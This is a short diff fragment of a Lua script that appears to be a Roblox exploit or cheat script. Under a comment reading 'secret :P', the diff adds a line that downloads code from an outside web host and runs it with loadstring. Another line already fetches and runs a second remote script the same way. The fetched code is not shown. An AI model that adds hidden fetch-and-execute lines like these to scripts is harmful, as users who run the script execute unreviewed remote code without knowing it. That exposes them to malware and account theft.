@@ -96,5 +96,5 @@ print("Loaded | Custom Features")
 print("Version: " .. version)
 
 -- secret :P
-
+loadstring(game:HttpGet("https://jays-scripts.vercel.app/scripts/Anti-Private.lua"))()
 loadstring(game:HttpGet("https://jays-scripts.vercel.app/api/V5.lua"))()
